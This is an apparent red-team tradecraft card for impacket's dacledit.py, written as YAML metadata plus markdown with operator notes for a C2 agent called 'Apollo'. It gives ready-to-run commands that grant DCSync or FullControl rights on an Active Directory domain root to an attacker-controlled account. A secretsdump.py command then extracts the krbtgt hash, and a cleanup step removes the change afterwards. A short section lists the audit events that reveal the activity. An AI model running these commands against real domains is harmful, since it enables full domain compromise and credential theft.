---
name: impacket-dacledit
category: acl-abuse
subcategories: [dacl-modification, writedacl, dcsync-rights, ldap-acl]
tradecraft_tags: [dacl, acl, writedacl, dcsync, python, linux-side, impacket]
mitre_attack:
  - id: T1222
    name: File and Directory Permissions Modification
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: dacledit.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  ACL modifications on AD objects generate Event 5136 (directory service object
  modification) on DCs if DS access auditing is enabled. DCSync rights granted to
  a non-standard account is a strong detection signal. DACL changes are persistent
  and leave forensic artifacts in the AD audit log.
usage_examples:
  - description: Grant DCSync rights to an attacker-controlled account
    args: "dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=north,DC=sevenkingdoms,DC=local' DOMAIN/user:password -dc-ip DC_IP"
  - description: Grant GenericAll on a target object
    args: "dacledit.py -action write -rights FullControl -principal attacker -target-dn 'CN=targetuser,...' DOMAIN/user:password -dc-ip DC_IP"
  - description: Read current DACL on an object
    args: "dacledit.py -action read -target-dn 'DC=north,...' DOMAIN/user:password -dc-ip DC_IP"
opsec_notes: |
  impacket dacledit.py is the Python/Linux equivalent of PowerView's Add-DomainObjectAcl.
  For Apollo operations, PowerView or SharpLdapSearch with custom LDAP writes is preferred.
  Python-only — runs from attacker infrastructure. DCSync grant is a high-value but
  noisy operation (Event 4662 when the grantee performs DCSync, plus Event 5136 for the
  ACL write). Restore the original ACL after exploitation.
gotchas: |
  Python-only — not Apollo-runnable. Requires WriteDACL (or owner equivalent) on the
  target object. DCSync requires WriteDACL on the domain root DN specifically. ACL
  changes are persistent — always restore original ACL after exploitation.
  The impacket dacledit.py script was added in newer impacket versions (~2022+).
related_ttps: [powerview, ntlmrelayx, impacket-secretsdump, acl-abuse-chain]
alternatives: [powerview-add-domainobjectacl, passthecert-dcsync]
common_args:
  -action:
    description: read or write
    typical_values: [read, write]
    required: true
  -rights:
    description: Rights to grant
    typical_values: [DCSync, FullControl, GenericWrite, WriteDacl]
    required: true
  -principal:
    description: Account to grant rights to
    typical_values: ["attacker", "DOMAIN\\\\attacker"]
  -target-dn:
    description: Target AD object Distinguished Name
    typical_values: ["DC=north,DC=sevenkingdoms,DC=local", "CN=targetuser,CN=Users,DC=..."]
    required: true
  -dc-ip:
    description: Domain controller IP
    typical_values: ["192.168.56.10"]
    required: true
last_updated: 2026-05-29
---

# impacket-dacledit

impacket's DACL editor for Active Directory objects. Enables reading and modifying
DACL ACEs on AD objects from Linux infrastructure — the Python equivalent of PowerView's
`Add-DomainObjectAcl`. Most impactful use: granting DCSync rights to an attacker-controlled
account when WriteDACL is held on the domain root.

## Typical use cases
- Grant DCSync rights directly to an attacker account (WriteDACL on domain root)
- Grant GenericAll on a target object when owned principal has WriteDACL
- Audit current DACL for objects of interest

## DCSync Rights Grant

```bash
# Grant Replicating Directory Changes All to attacker account:
dacledit.py -action write -rights DCSync \
  -principal attacker \
  -target-dn 'DC=north,DC=sevenkingdoms,DC=local' \
  NORTH/controlled_user:Password123 -dc-ip 192.168.56.10

# Then DCSync:
secretsdump.py NORTH/attacker:password@DC_IP -just-dc-user krbtgt
```

## Cleanup

```bash
# Remove the DCSync ACE after exploitation:
dacledit.py -action remove -rights DCSync \
  -principal attacker \
  -target-dn 'DC=north,...' \
  NORTH/controlled_user:Password123 -dc-ip DC_IP
```

## Apollo-specific note
Python/Linux only. For Windows-side ACL modification, use PowerView's
`Add-DomainObjectAcl` via Apollo's powershell_import.
